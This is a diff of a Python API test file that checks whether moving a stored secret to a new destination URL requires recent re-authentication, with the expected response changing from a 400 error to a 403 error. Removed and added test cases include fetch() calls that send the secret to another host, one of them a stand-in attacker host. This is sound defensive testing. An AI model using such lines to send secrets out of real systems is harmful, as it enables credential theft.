@@ -1389,16 +1389,24 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
 
     @parameterized.expand(
         [
-            ("unchanged_url", {}, {"secret": True}, 200),
-            ("body_change", {"body": {"value": "changed"}}, {"secret": True}, 200),
-            ("url_change", {"url": {"value": "https://attacker.example.com"}}, {"secret": True}, 400),
-            ("url_change_omitted_secret", {"url": {"value": "https://attacker.example.com"}}, None, 400),
-            ("url_change_new_secret", {"url": {"value": "https://new.example.com"}}, {"value": "NEW SECRET"}, 200),
+            ("unchanged_url", {}, {"secret": True}, True, 200),
+            ("body_change", {"body": {"value": "changed"}}, {"secret": True}, True, 200),
+            ("url_change", {"url": {"value": "https://new.example.com"}}, {"secret": True}, True, 403),
+            ("url_change_omitted_secret", {"url": {"value": "https://new.example.com"}}, None, True, 403),
+            # Entering the secret again in the same save moves nothing, so it needs no re-auth.
+            (
+                "url_change_new_secret",
+                {"url": {"value": "https://new.example.com"}},
+                {"value": "NEW SECRET"},
+                True,
+                200,
+            ),
+            ("url_change_fresh_session", {"url": {"value": "https://new.example.com"}}, {"secret": True}, False, 200),
         ]
     )
     @SECRET_BINDING_ENFORCED
-    def test_stored_secret_needs_reentry_when_its_url_changes(
-        self, _name: str, input_changes: dict, secret_input: Optional[dict], expected_status: int
+    def test_moving_a_stored_secret_needs_recent_authentication(
+        self, _name: str, input_changes: dict, secret_input: Optional[dict], stale: bool, expected_status: int
     ) -> None:
         payload = {
             "type": "destination",
@@ -1423,15 +1431,21 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
             inputs.pop("secret1")
         else:
             inputs["secret1"] = secret_input
+        if stale:
+            self._age_session(settings.SESSION_INTEGRATION_LINK_AGE + 60)
         res = self.client.patch(
             f"/api/projects/{self.team.id}/hog_functions/{create.json()['id']}", data={"inputs": inputs}
         )
 
         assert res.status_code == expected_status, res.json()
         stored = HogFunction.objects.get(id=create.json()["id"])
-        if expected_status == 400:
-            assert res.json()["attr"] == "inputs__secret1"
+        if expected_status == 403:
+            assert res.json()["code"] == "sensitive_action_required_reauth"
             assert (stored.inputs or {})["url"]["value"] == "https://example.com"
+        else:
+            assert (stored.inputs or {})["url"]["value"] == input_changes.get("url", {"value": "https://example.com"})[
+                "value"
+            ]
         assert stored.encrypted_inputs["secret1"]["value"] == (
             "NEW SECRET" if secret_input == {"value": "NEW SECRET"} else "I AM SECRET"
         )
@@ -1443,11 +1457,11 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
                 "fetch('https://example.com', {'method': 'PUT', 'headers': {'Authorization': inputs.secret1}});",
                 200,
             ),
-            ("new_url", "fetch('https://attacker.example.com', {'body': inputs.secret1});", 400),
+            ("new_url", "fetch('https://new.example.com', {'body': inputs.secret1});", 403),
         ]
     )
     @SECRET_BINDING_ENFORCED
-    def test_hog_code_change_needs_secret_reentry_when_its_url_changes(
+    def test_moving_a_stored_secret_by_code_edit_needs_recent_authentication(
         self, _name: str, new_hog: str, expected_status: int
     ) -> None:
         payload = {
@@ -1461,12 +1475,16 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
         assert create.status_code == 201, create.json()
         url = f"/api/projects/{self.team.id}/hog_functions/{create.json()['id']}"
 
+        self._age_session(settings.SESSION_INTEGRATION_LINK_AGE + 60)
         res = self.client.patch(url, data={"hog": new_hog})
         assert res.status_code == expected_status, res.json()
-        if expected_status == 400:
-            assert res.json()["attr"] == "inputs__secret1"
-            res = self.client.patch(url, data={"hog": new_hog, "inputs": {"secret1": {"value": "RETYPED"}}})
+        if expected_status == 403:
+            assert res.json()["code"] == "sensitive_action_required_reauth"
+            # The re-auth modal refreshes the session, and the same save then lands unchanged.
+            self._age_session(0)
+            res = self.client.patch(url, data={"hog": new_hog})
             assert res.status_code == 200, res.json()
+            assert HogFunction.objects.get(id=create.json()["id"]).encrypted_inputs["secret1"]["value"] == "I AM SECRET"
 
     def _age_session(self, seconds: float) -> None:
         aged = time.time() - seconds
